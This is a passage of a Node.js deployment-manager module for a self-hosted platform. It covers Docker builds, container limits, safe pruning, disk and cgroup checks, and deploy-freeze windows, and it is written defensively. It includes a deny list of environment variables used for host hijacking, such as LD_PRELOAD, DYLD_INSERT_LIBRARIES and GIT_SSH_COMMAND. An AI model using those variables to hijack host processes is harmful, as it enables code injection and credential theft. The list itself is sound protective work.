const { spawn } = require('child_process');
const { EventEmitter } = require('events');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');

const caddyManager = require('./caddyManager');
const repoSync = require('./repoSync');
const portRegistry = require('./portRegistry');
const { atomicWriteJsonSync, loadJsonWithBackupSync, assertContainedPath, isMetadataIp } = require('./ssrfGuard');
const { parseSafeCommandArgv, sanitizeWorkdir } = require('./safeCommand');

/** @type {any} */
let _ingressManager = null;
function getIngressManager() {
  if (!_ingressManager) {
    try { _ingressManager = require('./ingressManager'); } catch (e) {}
  }
  return _ingressManager;
}

/** @type {any} */
let _databaseManager = null;
function getDatabaseManager() {
  if (!_databaseManager) {
    try { _databaseManager = require('./databaseManager'); } catch (e) {}
  }
  return _databaseManager;
}
/** @type {any} */
let _projectManager = null;
function getProjectManager() {
  if (!_projectManager) {
    try { _projectManager = require('./projectManager'); } catch (e) {}
  }
  return _projectManager;
}
/** @type {any} */
let _serverFleetManager = null;
function getServerFleetManager() {
  if (!_serverFleetManager) {
    try { _serverFleetManager = require('./serverFleetManager'); } catch (e) {}
  }
  return _serverFleetManager;
}
/** @type {any} */
let _auditLogger = null;
function getAuditLogger() {
  if (!_auditLogger) {
    try { _auditLogger = require('./auditLogger'); } catch (e) {}
  }
  return _auditLogger;
}
/** @type {any} */
let _sleepAdvisor = null;
function getSleepAdvisor() {
  if (!_sleepAdvisor) {
    try { _sleepAdvisor = require('./sleepAdvisor'); } catch (e) {}
  }
  return _sleepAdvisor;
}
/** @type {any} */
let _environmentManager = null;
function getEnvironmentManager() {
  if (!_environmentManager) {
    try { _environmentManager = require('./environmentManager'); } catch (e) {}
  }
  return _environmentManager;
}

/** Calcula concurrencia máxima segura de builds según la RAM total del VPS para evitar OOM. */
function defaultMaxConcurrentBuilds() {
  const envVal = parseInt(String(process.env.CULKIBO_MAX_CONCURRENT_BUILDS || ''), 10);
  if (Number.isInteger(envVal) && envVal >= 1 && envVal <= 16) return envVal;
  const totalGb = os.totalmem() / (1024 * 1024 * 1024);
  if (totalGb <= 3) return 1;
  if (totalGb <= 6) return 2;
  return 3;
}

const ROOT_BASE_DIR = process.env.CULKIBO_DATA_DIR
  ? path.resolve(process.env.CULKIBO_DATA_DIR)
  : path.resolve(__dirname, '..', '..');
const DATA_DIR = path.join(ROOT_BASE_DIR, 'data');
const TMP_ENV_DIR = path.join(DATA_DIR, '.tmp');

/** Etiqueta que protege contenedores dormidos/críticos de cualquier poda agresiva (coolify#10996/#12542, kamal#1655). */
const PROTECTED_CONTAINER_LABEL = 'culkibo.protected';
/** Tope seguro para `--keep-storage` de BuildKit para evitar crecimiento descontrolado (>20 GB). */
const MAX_BUILDKIT_KEEP_STORAGE_GB = 20;
/** TTL por defecto de un bloqueo de despliegue antes de considerarse huérfano/bloqueado (Dokploy BullMQ deadlock). */
const DEPLOY_LOCK_DEFAULT_TTL_MS = 30 * 60 * 1000;
/** Drivers de log Docker que aceptan `--log-opt max-size` y `max-file` (kamal#1709). */
const SIZE_ROTATION_LOG_DRIVERS = new Set(['json-file', 'local']);
/** Lista blanca de log drivers Docker permitidos en contenedores gestionados. */
const ALLOWED_LOG_DRIVERS = new Set(['json-file', 'local', 'syslog', 'journald', 'none', 'fluentd', 'gelf', 'awslogs']);

/**
 * Devuelve un nombre determinista de red bridge aislada por proyecto (`dokploy#6028`)
 * para impedir colisiones DNS entre proyectos que comparten nombres de servicio como `api` o `web`.
 * @param {string} projectId
 * @returns {string}
 */
function getProjectNetworkName(projectId) {
  const clean = String(projectId || 'app')
    .toLowerCase()
    .replace(/[^a-z0-9_-]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 48) || 'app';
  return `culkibo-net-${clean}`;
}

/**
 * Comprueba de forma portable si un PID sigue vivo en el sistema operativo.
 * `EPERM` significa que el proceso existe pero pertenece a otro usuario; `ESRCH` significa muerto.
 * @param {number} pid
 * @returns {boolean}
 */
function isPidAlive(pid) {
  const n = Number(pid);
  if (!Number.isInteger(n) || n <= 0) return false;
  try {
    process.kill(n, 0);
    return true;
  } catch (err) {
    /** @type {any} */
    const e = err;
    if (e && e.code === 'EPERM') return true;
    return false;
  }
}

/**
 * Construye argumentos seguros de poda Docker (`container` | `image` | `builder`),
 * excluyendo siempre `label!=culkibo.protected=1` y acotando `--keep-storage` de BuildKit.
 * @param {'container' | 'image' | 'builder'} [kind]
 * @param {{ projectId?: string | null, keepStorageGb?: number, untilHours?: number | null }} [opts]
 * @returns {string[]}
 */
function buildSafePruneArgs(kind = 'container', opts = {}) {
  if (kind === 'builder') {
    const rawGb = opts.keepStorageGb != null ? Number(opts.keepStorageGb) : 10;
    const boundedGb = Math.min(Math.max(0, Math.round(Number.isFinite(rawGb) ? rawGb : 10)), MAX_BUILDKIT_KEEP_STORAGE_GB);
    const args = ['builder', 'prune', '--force', '--keep-storage', `${boundedGb}GB`];
    if (opts.untilHours != null && Number.isFinite(Number(opts.untilHours)) && Number(opts.untilHours) > 0) {
      args.push('--filter', `until=${Math.min(8760, Math.round(Number(opts.untilHours)))}h`);
    }
    return args;
  }
  if (kind === 'image') {
    const args = ['image', 'prune', '-f', '--filter', `label!=${PROTECTED_CONTAINER_LABEL}=1`];
    if (opts.projectId) {
      args.push('--filter', `label=com.culkibo.project_id=${String(opts.projectId)}`);
    }
    return args;
  }
  const args = ['container', 'prune', '-f', '--filter', `label!=${PROTECTED_CONTAINER_LABEL}=1`];
  if (opts.untilHours != null && Number.isFinite(Number(opts.untilHours)) && Number(opts.untilHours) > 0) {
    args.push('--filter', `until=${Math.min(8760, Math.round(Number(opts.untilHours)))}h`);
  }
  return args;
}

/** Variables del host que un proyecto jamás puede sobreescribir al invocar herramientas del host. */
const HOST_HIJACK_ENV_BLOCKLIST = new Set([
  'PATH', 'PATHEXT', 'COMSPEC', 'SYSTEMROOT', 'WINDIR',
  'DOCKER_HOST', 'DOCKER_CONFIG', 'DOCKER_CONTEXT', 'DOCKER_CERT_PATH', 'DOCKER_TLS_VERIFY', 'DOCKER_API_VERSION',
  'BUILDKIT_HOST', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
  'NODE_OPTIONS', 'BASH_ENV', 'ENV', 'IFS',
  'GIT_SSH_COMMAND', 'GIT_ASKPASS', 'GIT_EXEC_PATH',
  'HOME', 'USERPROFILE', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY'
]);

/** Filtra variables de usuario antes de mezclarlas con el entorno de un proceso del host (build/nixpacks). */
function filterSafeHostEnv(vars) {
  /** @type {Record<string, string>} */
  const out = {};
  for (const [k, v] of Object.entries(vars || {})) {
    if (!isValidEnvName(k)) continue;
    if (HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase())) continue;
    out[k] = String(v == null ? '' : v);
  }
  return out;
}

/** @type {any} */
let containerOrchestrator = null;
try { containerOrchestrator = require('./containerOrchestrator'); } catch (e) {}

/** @type {any} */
let notificationService = null;
try { notificationService = require('./notificationService'); } catch (e) {}

/**
 * Despliegue a producción: de un directorio con código a un servicio duradero.
 *
 * Esto es lo que separaba a Culkibo de un ejecutor de procesos de desarrollo.
 * `localRunner` clona y lanza `npm run dev`; aquí construimos una imagen,
 * arrancamos un contenedor con política de reinicio y límites, esperamos a que
 * esté sano y solo entonces movemos la ruta de Caddy.
 *
 * ---------------------------------------------------------------------------
 * POR QUÉ ESTÁ ESCRITO ASÍ (las tres decisiones que no son negociables)
 * ---------------------------------------------------------------------------
 *
 * 1. NUNCA SE CONSTRUYE UNA CADENA DE SHELL.
 *    Todo pasa por `spawn(bin, [argv], { shell: false })`. Los 21 críticos de
 *    Coolify y los 34 de Dokploy son una sola clase de fallo: un nombre de
 *    repositorio, una variable de entorno o un nombre de imagen interpolados en
 *    una cadena que acaba en `sh -c`. Sin shell no hay nada donde inyectar.
 *
 * 2. LOS SECRETOS NO PASAN POR ARGV.
 *    `docker run -e CLAVE` (sin `=valor`) toma el valor del entorno del proceso
 *    que lanza docker. Lo mismo `docker build --build-arg NOMBRE`. Así el valor
 *    viaja por el entorno del hijo y jamás aparece en `ps`, ni en los logs de
 *    build, ni en un mensaje de error. En argv solo viajan NOMBRES, que no son
 *    secretos.
 *
 * 3. CULKIBO NO INYECTA NINGÚN BUILD ARG QUE CAMBIE ENTRE BUILDS.
 *    Coolify se destruyó su propia caché de capas inyectando un argumento que
 *    cambiaba en cada ejecución (issue #7040: 1 min -> 4,5 min).
 *
 *    El mecanismo exacto, según la referencia de Dockerfile de BuildKit: la
 *    línea `ARG` en sí no entra en ninguna clave de caché, pero a partir de ella
 *    la variable se inyecta en el ENTORNO de cada `RUN` posterior, y la clave de
 *    caché de un `RUN` se calcula sobre su línea de comandos MÁS ese entorno.
 *    Por eso el fallo de caché ocurre en el PRIMER USO, no en la definición, y
 *    a partir de ahí se propaga a todas las capas siguientes. Un `ARG` volátil
 *    declarado arriba del fichero tira el build entero.
 *
 *    Aquí el conjunto de build args que aporta Culkibo es literalmente vacío;
 *    solo se pasan los que el usuario declare, y se pasan por nombre.
 *    `tests/deploy.test.js` lo verifica comparando dos invocaciones consecutivas
 *    byte a byte.
 */

// ---------------------------------------------------------------------------
// Parámetros por defecto
//
// Los tiempos siguen a basecamp/kamal-proxy, que es el arte previo correcto
// para esto. Valores leídos de su `internal/server/service.go`:
//   DefaultDeployTimeout        = 30 s
//   DefaultDrainTimeout         = 30 s
//   DefaultHealthCheckInterval  =  1 s
//   DefaultHealthCheckTimeout   =  5 s
//   DefaultHealthCheckPath      = "/up"
//
// Divergencia deliberada: kamal considera sano solo un 200-299 sobre `/up`,
// porque Rails expone ese endpoint por convención. Culkibo despliega cualquier
// cosa que le echen, así que sondea `/` y acepta cualquier estado < 500: un 404
// en la raíz significa que el proceso escucha y enruta —está vivo—, mientras que
// un 502 significa que no. El endpoint y el umbral son configurables.
// ---------------------------------------------------------------------------
const DEFAULTS = {
  buildTimeoutMs: 20 * 60 * 1000,
  healthTimeoutMs: 30000,
  healthIntervalMs: 1000,
  healthPath: '/',
  healthStartPeriodSec: 10,
  healthRetries: 3,
  healthyThreshold: 1,
  // Ventana durante la cual el contenedor viejo SIGUE VIVO después de que la
  // ruta ya apunte al nuevo. Es el apretón de manos que le falta a Coolify
  // (issue #8627): allí el contenedor viejo muere a la vez que se recarga el
  // proxy, y las peticiones en vuelo se convierten en 502/503.
  drainTimeoutMs: 30000,
  stopGraceSeconds: 30,
  stopGracePeriodSec: 30,
  logDriver: 'json-file',
  logMaxSizeMb: 10,
  logMaxFiles: 3,
  memoryMb: 1024,
  cpus: '1.0',
  pidsLimit: 512,
  containerPort: 3000,
  // Generaciones que se conservan paradas (no borradas) para que un rollback
  // sea arrancar-y-conmutar en vez de reconstruir.
  keepReleases: 2,
  network: process.env.CULKIBO_DOCKER_NETWORK || 'culkibo',
  caddyContainerName: process.env.CULKIBO_CADDY_CONTAINER || 'culkibo-caddy'
};

const STORE_FILE = path.join(DATA_DIR, 'deployments.json');
const STORE_BAK_FILE = `${STORE_FILE}.bak`;
const FREEZE_STORE_FILE = path.join(DATA_DIR, 'deploy-freeze.json');
const MAX_SMOKE_BODY_BYTES = 256 * 1024;
const SMOKE_BLOCKED_HEADERS = /^(host|connection|content-length|transfer-encoding|keep-alive|te|trailer|upgrade)$/i;
const WEEKDAY_SHORT_TO_INDEX = { sun: 0, mon: 1, tue: 2, wed: 3, thu: 4, fri: 5, sat: 6 };
const NON_TERMINAL_STATUSES = new Set([
  'pendiente', 'en_cola', 'sincronizando', 'construyendo', 'pre_deploy', 'arrancando', 'verificando', 'smoke_test', 'canario', 'promocionando', 'post_deploy'
]);
const MAX_RUNTIME_LOG_STREAMS = 20;
const DEFAULT_MIN_DISK_FREE_BYTES = 64 * 1024 * 1024; // 64 MiB pre-deploy ENOSPC guard (Cosmos#591)
const STORE_MIN_DISK_FREE_BYTES = 16 * 1024 * 1024;   // 16 MiB pre-write guard for metadata store
const FORBIDDEN_COMPOSE_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

/**
 * Guardia pre-escritura anti-ENOSPC (Cosmos#591): comprueba el espacio libre disponible
 * mediante `fs.statfsSync` (Node nativo, 0 deps, 0 shell) antes de escribir en disco o desplegar.
 * Lanza un error HTTP 507 (`code: 'DISK_FULL'`) en lugar de truncar o corromper estado.
 *
 * @param {string} targetDir
 * @param {number} [minFreeBytes]
 * @param {{ statfsImpl?: (p: string) => { bavail: number, bsize: number, blocks?: number } }} [opts]
 * @returns {{ ok: true, freeBytes: number | null, totalBytes: number | null, requiredBytes: number, path: string }}
 */
function assertDiskHeadroom(targetDir, minFreeBytes = DEFAULT_MIN_DISK_FREE_BYTES, opts = {}) {
  const required = Math.max(0, Number(minFreeBytes) || 0);
  let probeDir = path.resolve(targetDir || DATA_DIR || '.');
  while (probeDir && !fs.existsSync(probeDir)) {
    const parent = path.dirname(probeDir);
    if (parent === probeDir) break;
    probeDir = parent;
  }
  if (required <= 0) {
    return { ok: true, freeBytes: null, totalBytes: null, requiredBytes: 0, path: probeDir };
  }
  const statfsFn = typeof opts.statfsImpl === 'function'
    ? opts.statfsImpl
    : (typeof fs.statfsSync === 'function' ? (p) => fs.statfsSync(p) : null);
  if (!statfsFn) {
    return { ok: true, freeBytes: null, totalBytes: null, requiredBytes: required, path: probeDir };
  }
  const st = statfsFn(probeDir);
  const bsize = Number(st && st.bsize);
  const bavail = Number(st && st.bavail);
  const blocks = Number(st && st.blocks);
  const freeBytes = Number.isFinite(bavail) && Number.isFinite(bsize) ? bavail * bsize : null;
  const totalBytes = Number.isFinite(blocks) && Number.isFinite(bsize) ? blocks * bsize : null;
  if (freeBytes !== null && freeBytes < required) {
    /** @type {Error & { status?: number, code?: string, freeBytes?: number, totalBytes?: number | null, requiredBytes?: number, path?: string }} */
    const err = new Error(
      `Espacio en disco insuficiente en ${probeDir}: ${(freeBytes / (1024 * 1024)).toFixed(1)} MiB libres < ${(required / (1024 * 1024)).toFixed(1)} MiB requeridos (ENOSPC prevenido)`
    );
    err.status = 507;
    err.code = 'DISK_FULL';
    err.freeBytes = freeBytes;
    err.totalBytes = totalBytes;
    err.requiredBytes = required;
    err.path = probeDir;
    throw err;
  }
  return { ok: true, freeBytes, totalBytes, requiredBytes: required, path: probeDir };
}

/**
 * Parsea métricas reales de RAM de Linux cgroup v2 (`memory.current`, `memory.max`, `memory.stat`)
 * restando `inactive_file` (caché de página recuperable) para obtener el working-set real del contenedor
 * y evitar falsas alarmas de ~95% RAM / OOM (runtipi#2445).
 *
 * @param {{
 *   currentRaw: string | number,
 *   maxRaw?: string | number | null,
 *   statRaw?: string | null,
 *   swapCurrentRaw?: string | number | null
 * }} raw
 */
function parseCgroupV2MemoryStats(raw) {
  const currentBytes = Math.max(0, parseInt(String(raw && raw.currentRaw != null ? raw.currentRaw : '0').trim(), 10) || 0);
  const maxStr = String(raw && raw.maxRaw != null ? raw.maxRaw : 'max').trim().toLowerCase();
  const unlimited = !maxStr || maxStr === 'max' || maxStr === 'unlimited';
  const parsedLimit = unlimited ? null : (parseInt(maxStr, 10) || null);
  const limitBytes = parsedLimit && parsedLimit > 0 ? parsedLimit : null;
  const swapBytes = Math.max(0, parseInt(String(raw && raw.swapCurrentRaw != null ? raw.swapCurrentRaw : '0').trim(), 10) || 0);

  /** @type {Record<string, number>} */
  const statMap = Object.create(null);
  const statText = String((raw && raw.statRaw) || '');
  if (statText) {
    for (const line of statText.split(/\r?\n/)) {
      const m = line.trim().match(/^([a-z0-9_]+)\s+(\d+)$/);
      if (m && !FORBIDDEN_COMPOSE_KEYS.has(m[1])) {
        statMap[m[1]] = parseInt(m[2], 10) || 0;
      }
    }
  }

  const inactiveFileBytes = statMap.inactive_file || 0;
  const activeFileBytes = statMap.active_file || 0;
  const anonBytes = statMap.anon || 0;
  const fileBytes = statMap.file || (activeFileBytes + inactiveFileBytes);
  const slabBytes = statMap.slab || 0;
  const oomKills = statMap.oom_kill || 0;

  // Fórmula cAdvisor / Docker v25+ cgroup v2: working_set = max(0, memory.current - inactive_file)
  const workingSetBytes = Math.max(0, currentBytes - inactiveFileBytes);
  const usagePercent = limitBytes ? Math.round((workingSetBytes / limitBytes) * 10000) / 100 : null;
  const rawUsagePercent = limitBytes ? Math.round((currentBytes / limitBytes) * 10000) / 100 : null;

  return {
    cgroupVersion: 2,
    currentBytes,
    workingSetBytes,
    workingSetMb: Math.round((workingSetBytes / (1024 * 1024)) * 100) / 100,
    reclaimableCacheBytes: inactiveFileBytes,
    anonBytes,
    fileBytes,
    activeFileBytes,
    slabBytes,
    swapBytes,
    limitBytes,
    limitMb: limitBytes ? Math.round((limitBytes / (1024 * 1024)) * 100) / 100 : null,
    unlimited: limitBytes === null,
    usagePercent,
    rawUsagePercent,
    oomKills
  };
}

/**
 * Lee archivos Linux cgroup v2 de un contenedor Docker (0 shell, lectura directa en /sys/fs/cgroup).
 * Devuelve `null` en hosts no-Linux o si la jerarquía cgroup v2 no está expuesta.
 *
 * @param {string} containerId
 * @param {{ cgroupDir?: string | null }} [opts]
 */
function readContainerCgroupV2Memory(containerId, opts = {}) {
  /** @type {string[]} */
  const candidates = [];
  if (opts && opts.cgroupDir) {
    candidates.push(path.resolve(opts.cgroupDir));
  } else if (process.platform === 'linux' && typeof containerId === 'string' && /^[a-f0-9]{12,64}$/i.test(containerId.trim())) {
    const cid = containerId.trim().toLowerCase();
    candidates.push(
      `/sys/fs/cgroup/system.slice/docker-${cid}.scope`,
      `/sys/fs/cgroup/docker/${cid}`
    );
  }
  for (const dir of candidates) {
    const curPath = path.join(dir, 'memory.current');
    if (!fs.existsSync(curPath)) continue;
    try {
      const currentRaw = fs.readFileSync(curPath, 'utf8');
      const maxPath = path.join(dir, 'memory.max');
      const statPath = path.join(dir, 'memory.stat');
      const swapPath = path.join(dir, 'memory.swap.current');
      return parseCgroupV2MemoryStats({
        currentRaw,
        maxRaw: fs.existsSync(maxPath) ? fs.readFileSync(maxPath, 'utf8') : 'max',
        statRaw: fs.existsSync(statPath) ? fs.readFileSync(statPath, 'utf8') : '',
        swapCurrentRaw: fs.existsSync(swapPath) ? fs.readFileSync(swapPath, 'utf8') : '0'
      });
    } catch (e) {
      return null;
    }
  }
  return null;
}

/**
 * Extrae nombres de servicio del bloque `services:` de un archivo Docker Compose YAML (0 deps).
 * @param {string} composeYaml
 * @returns {string[]}
 */
function extractComposeServiceNames(composeYaml) {
  const lines = String(composeYaml || '').split(/\r?\n/);
  /** @type {string[]} */
  const names = [];
  let inServices = false;
  let serviceIndent = -1;

  for (const rawLine of lines) {
    const trimmed = rawLine.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const indent = rawLine.search(/\S/);
    if (indent === 0) {
      if (/^services\s*:\s*(?:#.*)?$/.test(trimmed)) {
        inServices = true;
        serviceIndent = -1;
      } else {
        inServices = false;
      }
      continue;
    }
    if (!inServices) continue;
    if (serviceIndent === -1 && !trimmed.startsWith('-')) {
      serviceIndent = indent;
    }
    if (indent === serviceIndent && !trimmed.startsWith('-')) {
      const m = trimmed.match(/^([a-zA-Z0-9._-]+)\s*:/);
      if (m && !FORBIDDEN_COMPOSE_KEYS.has(m[1])) {
        names.push(m[1]);
      }
    }
  }
  return Array.from(new Set(names));
}

/**
 * Genera un archivo override determinista de Docker Compose que inyecta límites cgroup
 * (`mem_limit`, `memswap_limit`, `cpus`, `pids_limit` y `deploy.resources.limits`) en TODOS
 * los servicios del stack para que los límites configurados en la UI jamás se descarten
 * silenciosamente en aplicaciones Compose (coolify#12414).
 *
 * @param {string | string[]} composeTextOrServices
 * @param {{ memoryMb?: number | string | null, cpus?: number | string | null, pidsLimit?: number | string | null }} [limits]
 */
function buildComposeResourceOverride(composeTextOrServices, limits = {}) {
  const rawList = Array.isArray(composeTextOrServices)
    ? composeTextOrServices
    : extractComposeServiceNames(String(composeTextOrServices || ''));
  const services = Array.from(new Set(
    rawList
      .map((s) => String(s || '').trim())
      .filter((s) => /^[a-zA-Z0-9._-]{1,64}$/.test(s) && !FORBIDDEN_COMPOSE_KEYS.has(s))
  ));
  if (services.length === 0) {
    throw new Error('No se encontraron servicios válidos en el archivo Docker Compose para aplicar límites de recursos');
  }

  const rawMem = limits.memoryMb != null ? Number(limits.memoryMb) : DEFAULTS.memoryMb;
  const memoryMb = Number.isFinite(rawMem) ? Math.min(65536, Math.max(32, Math.round(rawMem))) : DEFAULTS.memoryMb;
  const rawCpus = limits.cpus != null ? Number(limits.cpus) : Number(DEFAULTS.cpus);
  const cpusNum = Number.isFinite(rawCpus) ? Math.min(64, Math.max(0.1, Math.round(rawCpus * 100) / 100)) : Number(DEFAULTS.cpus);
  const cpusStr = String(cpusNum);
  const rawPids = limits.pidsLimit != null ? Number(limits.pidsLimit) : DEFAULTS.pidsLimit;
  const pidsLimit = Number.isFinite(rawPids) ? Math.min(16384, Math.max(16, Math.round(rawPids))) : DEFAULTS.pidsLimit;

  const lines = [
    '# Culkibo Compose cgroup resource enforcement override (coolify#12414)',
    'services:'
  ];
  for (const svc of services) {
    lines.push(
      `  ${svc}:`,
      `    mem_limit: ${memoryMb}m`,
      `    memswap_limit: ${memoryMb}m`,
      `    cpus: ${cpusStr}`,
      `    pids_limit: ${pidsLimit}`,
      '    deploy:',
      '      resources:',
      '        limits:',
      `          memory: ${memoryMb}M`,
      `          cpus: "${cpusStr}"`
    );
  }
  const overrideYaml = lines.join('\n') + '\n';
  return { services, memoryMb, cpus: cpusStr, pidsLimit, overrideYaml };
}

/**
 * Construye argv seguro (`shell: false`) para `docker compose up -d` incluyendo override de límites.
 * @param {{ composeFile: string, overrideFile?: string | null, projectName?: string, envFile?: string | null }} opts
 * @returns {string[]}
 */
function buildComposeUpArgs(opts) {
  const args = ['compose'];
  if (opts.projectName) {
    args.push('-p', `culkibo_${safeSlug(opts.projectName)}`);
  }
  args.push('-f', String(opts.composeFile));
  if (opts.overrideFile) {
    args.push('-f', String(opts.overrideFile));
  }
  if (opts.envFile) {
    args.push('--env-file', String(opts.envFile));
  }
  args.push('up', '-d', '--remove-orphans');
  return args;
}

/**
 * Lee un archivo `docker-compose.yml` / `compose.yaml`, genera el override con límites cgroup
 * (`memoryMb`/`cpus`/`pidsLimit`) del proyecto y lo escribe de forma segura en disco (`0o600`).
 *
 * @param {string} composePath
 * @param {any} [project]
 * @param {{ overrideDir?: string | null, memoryMb?: number, cpus?: string | number, pidsLimit?: number, skipDiskCheck?: boolean }} [opts]
 */
function enforceComposeResourceLimits(composePath, project = null, opts = {}) {
  const absCompose = path.resolve(String(composePath || ''));
  if (!fs.existsSync(absCompose)) {
    throw new Error(`Archivo Docker Compose no encontrado: ${absCompose}`);
  }
  const yamlText = fs.readFileSync(absCompose, 'utf8');
  const built = buildComposeResourceOverride(yamlText, {
    memoryMb: opts.memoryMb !== undefined ? opts.memoryMb : (project && project.memoryMb),
    cpus: opts.cpus !== undefined ? opts.cpus : (project && project.cpus),
    pidsLimit: opts.pidsLimit !== undefined ? opts.pidsLimit : DEFAULTS.pidsLimit
  });
  const outDir = opts.overrideDir ? path.resolve(opts.overrideDir) : path.dirname(absCompose);
  if (!opts.skipDiskCheck) {
    const minFree = process.env.CULKIBO_MIN_FREE_BYTES != null
      ? Number(process.env.CULKIBO_MIN_FREE_BYTES)
      : STORE_MIN_DISK_FREE_BYTES;
    assertDiskHeadroom(outDir, minFree);
  }
  fs.mkdirSync(outDir, { recursive: true, mode: 0o700 });
  const overridePath = path.join(outDir, `culkibo.limits.${safeSlug((project && project.id) || 'compose')}.override.yml`);
  fs.writeFileSync(overridePath, built.overrideYaml, { encoding: 'utf8', mode: 0o600 });
  return {
    ...built,
    composePath: absCompose,
    overridePath,
    composeArgs: buildComposeUpArgs({
      composeFile: absCompose,
      overrideFile: overridePath,
      projectName: (project && project.id) || path.basename(path.dirname(absCompose))
    })
  };
}

// ---------------------------------------------------------------------------
// Saneadores
//
// Todo lo que viene del proyecto (id, nombre, package.json del repositorio
// clonado) es influenciable por quien controla el repositorio. Antes de que
// toque un argv o el texto de un Dockerfile pasa por aquí.
// ---------------------------------------------------------------------------

/** Etiqueta apta para nombre de imagen/contenedor de Docker. */
function safeSlug(value, fallback = 'app') {
  const slug = String(value == null ? '' : value)
    .toLowerCase()
    .replace(/[^a-z0-9_.-]/g, '-')
    .replace(/^[^a-z0-9]+/, '')
    .replace(/-+/g, '-')
    .slice(0, 48);
  return slug || fallback;
}

/**
 * Un nombre de variable de entorno válido en POSIX.
 *
 * Importa más de lo que parece: el nombre SÍ viaja en argv. Si aceptásemos
 * cualquier cosa, una clave llamada `--privileged` acabaría en la línea de
 * comandos de `docker run`. Docker la consumiría como valor de `-e`, pero no
 * queremos depender de ese detalle: se rechaza y punto.
 */
function isValidEnvName(name) {
  return typeof name === 'string' && /^[A-Za-z_][A-Za-z0-9_]{0,254}$/.test(name);
}

/**
 * Ruta de sondeo de salud. Va tanto a una URL como al `--health-cmd` del
 * contenedor, así que se restringe a un subconjunto sin comillas, espacios ni
 * `..`.
 */
function sanitizeHealthPath(value) {
  const raw = String(value == null ? '' : value).trim() || '/';
  if (!/^\/[A-Za-z0-9._~\-/]*$/.test(raw)) return null;
  if (raw.includes('..')) return null;
  return raw;
}

/**
 * Ruta segura para smoke tests post-despliegue: nunca permite URLs completas,
 * `//`, traversal `..`, espacios ni caracteres de control; admite query strings.
 * @param {any} value
 * @returns {string | null}
 */
function sanitizeSmokePath(value) {
  if (typeof value !== 'string') return null;
  const raw = value.trim();
  if (!raw || raw.length > 512) return null;
  if (!raw.startsWith('/') || raw.startsWith('//')) return null;
  if (raw.includes('..') || raw.includes('://') || /[\s\r\n\0]/.test(raw)) return null;
  return raw;
}

/**
 * Convierte `HH:MM` (00:00..24:00) a minutos desde medianoche.
 * @param {string} hhmm
 * @returns {number | null}
 */
function parseTimeToMinutes(hhmm) {
  if (typeof hhmm !== 'string') return null;
  const m = hhmm.trim().match(/^(\d{2}):(\d{2})$/);
  if (!m) return null;
  const h = parseInt(m[1], 10);
  const min = parseInt(m[2], 10);
  if (h === 24 && min === 0) return 1440;
  if (h < 0 || h > 23 || min < 0 || min > 59) return null;
  return h * 60 + min;
}

/**
 * Obtiene día de semana (0=domingo..6=sábado) y minutos del día (0..1439)
 * en cualquier zona horaria IANA usando V8 `Intl.DateTimeFormat` nativo (0 deps).
 * @param {Date} date
 * @param {string} timeZone
 * @returns {{ dow: number, minutes: number } | null}
 */
function getZonedDayAndMinutes(date, timeZone) {
  try {
    const parts = new Intl.DateTimeFormat('en-US', {
      timeZone: timeZone || 'UTC',
      weekday: 'short',
      hour: '2-digit',
      minute: '2-digit',
      hourCycle: 'h23'
    }).formatToParts(date);
    let weekday = '';
    let hour = 0;
    let minute = 0;
    for (const p of parts) {
      if (p.type === 'weekday') weekday = p.value.toLowerCase().slice(0, 3);
      else if (p.type === 'hour') hour = parseInt(p.value, 10) || 0;
      else if (p.type === 'minute') minute = parseInt(p.value, 10) || 0;
    }
    if (hour === 24) hour = 0;
    const dow = Object.prototype.hasOwnProperty.call(WEEKDAY_SHORT_TO_INDEX, weekday)
      ? WEEKDAY_SHORT_TO_INDEX[/** @type {keyof typeof WEEKDAY_SHORT_TO_INDEX} */ (weekday)]
      : date.getUTCDay();
    return { dow, minutes: hour * 60 + minute };
  } catch (e) {
    return null;
  }
}

/**
 * Normaliza lista de días a un Set de enteros `0..6`.
 * @param {any} rawDays
 * @returns {Set<number>}
 */
function normalizeFreezeDays(rawDays) {
  if (!Array.isArray(rawDays) || rawDays.length === 0) {
    return new Set([0, 1, 2, 3, 4, 5, 6]);
  }
  /** @type {Set<number>} */
  const out = new Set();
  for (const d of rawDays) {
    if (typeof d === 'number' && Number.isInteger(d) && d >= 0 && d <= 6) {
      out.add(d);
    } else if (typeof d === 'string') {
      const key = d.trim().toLowerCase().slice(0, 3);
      if (Object.prototype.hasOwnProperty.call(WEEKDAY_SHORT_TO_INDEX, key)) {
        out.add(WEEKDAY_SHORT_TO_INDEX[/** @type {keyof typeof WEEKDAY_SHORT_TO_INDEX} */ (key)]);
      } else {
        const parsed = parseInt(d.trim(), 10);
        if (Number.isInteger(parsed) && parsed >= 0 && parsed <= 6) out.add(parsed);
      }
    }
  }
  return out;
}

/**
 * Evalúa si una ventana de congelación está activa en `date` para `trigger`.
 * Soporta rangos en el mismo día, rangos nocturnos (`start > end`) y ventanas puntuales (`kind: 'once'`).
 * @param {any} win
 * @param {Date} date
 * @param {string} trigger
 * @returns {boolean}
 */
function matchesFreezeWindow(win, date, trigger) {
  if (!win || typeof win !== 'object' || win.enabled === false) return false;
  if (Array.isArray(win.blockTriggers) && win.blockTriggers.length > 0 && trigger) {
    if (!win.blockTriggers.includes(trigger)) return false;
  }

  if (win.kind === 'once' && win.startAt && win.endAt) {
    const startMs = Date.parse(String(win.startAt));
    const endMs = Date.parse(String(win.endAt));
    const nowMs = date.getTime();
    return Number.isFinite(startMs) && Number.isFinite(endMs) && nowMs >= startMs && nowMs < endMs;
  }

  const tz = String(win.tz || win.timezone || 'UTC').trim() || 'UTC';
  const zoned = getZonedDayAndMinutes(date, tz);
  if (!zoned) return false;

  /** @type {number | null} */
  let startMin = null;
  /** @type {number | null} */
  let endMin = null;
  if (win.startHour !== undefined && win.endHour !== undefined) {
    const sh = Number(win.startHour);
    const eh = Number(win.endHour);
    if (Number.isFinite(sh) && Number.isFinite(eh) && sh >= 0 && sh <= 23 && eh >= 0 && eh <= 24) {
      startMin = Math.round(sh * 60);
      endMin = Math.round(eh * 60);
    }
  } else if (typeof win.startTime === 'string' && typeof win.endTime === 'string') {
    startMin = parseTimeToMinutes(win.startTime);
